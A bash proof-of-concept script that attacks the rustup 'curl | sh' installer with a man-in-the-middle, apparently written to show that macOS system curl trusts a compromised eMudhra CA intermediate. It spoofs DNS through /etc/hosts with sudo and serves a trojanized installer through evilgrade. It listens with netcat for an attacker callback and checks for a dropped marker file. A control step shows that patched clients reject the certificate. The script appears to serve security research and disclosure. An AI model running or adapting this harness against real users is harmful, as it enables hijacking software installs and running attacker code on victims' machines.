#!/bin/bash
###############################################################################
# run_curlbash.sh - `curl https://sh.rustup.rs | sh` MITM via the compromised
#                   eMudhra CA, end to end, driven by REAL evilgrade.
#
# What it proves: the single most common install idiom -- piping a remote script
# straight into a shell -- has NO integrity layer (no signature, no checksum).
# Its entire security is TLS. The SYSTEM curl validates against the macOS trust
# store, which still contains the public AAA root that the compromised eMudhra
# intermediate "EM DV TLS CA - G3C" chains to, so a BARE one-liner (no flags,
# no env vars -- exactly the command printed on rustup.rs) runs our script.
#
# This is the honest, default-exploitable case on macOS: unlike pip (own certifi
# bundle) or Homebrew git (own openssl bundle), both of which have already
# removed the AAA root and are therefore NOT vulnerable by default, the system
# curl trusts our eMudhra-signed cert out of the box.
#
# TWO MODES:
#   (default) REALISTIC  -- evilgrade binds :443, victim runs the EXACT rustup
#                           one-liner against https://sh.rustup.rs. Needs sudo
#                           (:443 + /etc/hosts DNS redirect).
#   --high-port          -- evilgrade binds :9443, victim uses curl --resolve to
#                           point sh.rustup.rs at it. No sudo at all.
###############################################################################
set -u
cd "$(dirname "$0")/../.." || exit 1
. demo/emudhra_mitm/_lib.sh

MODE=realistic
[ "${1:-}" = "--high-port" ] && MODE=highport
LPORT=4444
HOST=sh.rustup.rs
# Spoof ONLY the preinstaller host. static.rust-lang.org is left alone so the
# trojanized preinstaller's stage-2 fetch of the real rustup-init binary
# reaches the genuine CDN (realistic minimal-MITM, and the victim gets real Rust).
HOSTS_LINE="127.0.0.1 sh.rustup.rs"

if [ "$MODE" = realistic ]; then
    PORT=443; URL="https://$HOST/"; RESOLVE=""
else
    pick_port PORT 9443 9543 12443 18443
    URL="https://$HOST:$PORT/"; RESOLVE="--resolve $HOST:$PORT:127.0.0.1"
fi

HOSTS_ADDED=0
cleanup() {
    [ -n "${EG_PID:-}" ] && kill "$EG_PID" 2>/dev/null
    sudo pkill -9 -f "demo/emudhra_mitm/serve.pl $PORT" 2>/dev/null
    pkill -9 -f "demo/emudhra_mitm/serve.pl $PORT" 2>/dev/null
    [ -n "${NCPID:-}" ] && kill "$NCPID" 2>/dev/null
    [ "$HOSTS_ADDED" = 1 ] && { sudo sed -i '' "\|^${HOSTS_LINE}\$|d" /etc/hosts 2>/dev/null; echo "[cleanup] reverted /etc/hosts"; }
    rm -f /tmp/OWNED_BY_CURLBASH
    wait 2>/dev/null
}
trap cleanup EXIT INT TERM

rm -f /tmp/OWNED_BY_CURLBASH /tmp/curlbash_cb.log
( nc -l "$LPORT" > /tmp/curlbash_cb.log 2>&1 ) & NCPID=$!

if [ "$MODE" = realistic ]; then
    echo "== DNS spoof: adding '$HOSTS_LINE' to /etc/hosts (sudo; reverted on exit) =="
    if ! grep -qF "$HOSTS_LINE" /etc/hosts 2>/dev/null; then
        echo "$HOSTS_LINE" | sudo tee -a /etc/hosts >/dev/null || { echo "   sudo failed; aborting"; exit 1; }
        HOSTS_ADDED=1
    else echo "   (already present)"; fi
fi

echo "== starting REAL evilgrade webserver (curlbash_installer, eMudhra cert) on :$PORT =="
if [ "$PORT" = 443 ]; then
    start_evilgrade_root "$PORT" /tmp/eg_curlbash.log "curlbash_installer" || exit 1
else
    start_evilgrade "$PORT" /tmp/eg_curlbash.log "curlbash_installer" || exit 1
fi

echo
echo "== VICTIM: the exact rustup one-liner (system curl, no trust flags) =="
echo "   \$ curl --proto '=https' --tlsv1.2 -sSf $RESOLVE $URL | sh"
echo "   ---- output (as the victim sees it) ----"
curl --proto '=https' --tlsv1.2 -sSf $RESOLVE "$URL" | sh 2>&1 | sed 's/^/   /'
sleep 2

echo
echo "== PROOF: /tmp/OWNED_BY_CURLBASH (dropped by the piped script) =="
[ -f /tmp/OWNED_BY_CURLBASH ] && sed 's/^/   /' /tmp/OWNED_BY_CURLBASH || echo "   <not created>"
echo "== PROOF: attacker callback on 127.0.0.1:$LPORT =="
[ -s /tmp/curlbash_cb.log ] && sed 's/^/   /' /tmp/curlbash_cb.log || echo "   <none>"

echo
echo "== CONTROL: a client whose bundle removed the AAA root must REJECT =="
printf "   Homebrew curl (own openssl bundle, no AAA): "
BREW_CURL=/opt/homebrew/opt/curl/bin/curl
if [ -x "$BREW_CURL" ]; then
    if "$BREW_CURL" --proto '=https' --tlsv1.2 -sSf $RESOLVE "$URL" >/dev/null 2>&1; then
        echo "accepted (unexpected)"
    else
        echo "REJECTED (eMudhra chain not trusted) -- as expected"
    fi
else
    # fall back to Homebrew python ssl as the 'patched bundle' control
    printf "(no brew curl; using Homebrew python ssl) "
    if /opt/homebrew/bin/python3 - "$PORT" <<'PY' 2>/dev/null
import ssl,socket,sys
port=int(sys.argv[1])
try:
    c=ssl.create_default_context()
    with socket.create_connection(('127.0.0.1',port),timeout=5) as r:
        with c.wrap_socket(r,server_hostname='sh.rustup.rs'): print('accepted')
except Exception: raise SystemExit(1)
PY
    then echo "accepted (unexpected)"; else echo "REJECTED -- as expected"; fi
fi

echo
echo "   NOTE: the victim command above is the UNMODIFIED rustup one-liner -- no --cacert,"
echo "   no env var, no injected CA. The cert is a real eMudhra intermediate (compromised"
echo "   key) cross-signed by the public AAA root, trusted by the system curl by default."
echo; echo "== done =="
